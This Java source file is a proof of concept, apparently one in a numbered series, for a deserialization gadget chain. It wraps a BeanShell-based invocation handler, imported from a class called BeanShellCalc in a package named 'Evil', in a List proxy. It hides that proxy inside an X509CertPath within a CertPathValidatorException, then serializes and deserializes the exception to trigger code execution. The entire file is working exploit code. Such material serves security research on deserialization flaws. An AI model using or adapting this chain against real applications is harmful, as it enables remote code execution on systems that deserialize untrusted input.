package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import sun.security.provider.certpath.X509CertPath;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.cert.CertPathValidatorException;
import java.util.List;

public class POC_11 {

    /***
     * run with certPath.jar
     */

    public static void main(String[] args) throws Exception {

        InvocationHandler handler = BeanShellCalc.getHandler("size");
        List m = (List) Proxy.newProxyInstance(List.class.getClassLoader(), new Class<?>[]{List.class}, handler);

        X509CertPath path = (X509CertPath) ReflectionUtil.createWithoutConstructor(Class.forName("sun.security.provider.certpath.X509CertPath"));
        ReflectionUtil.setField(path, "certs", m);
        CertPathValidatorException exception = new CertPathValidatorException();
        ReflectionUtil.setField(exception, "certPath", path);

        SerializeUtil.deserialize(SerializeUtil.serialize(exception));
    }

}
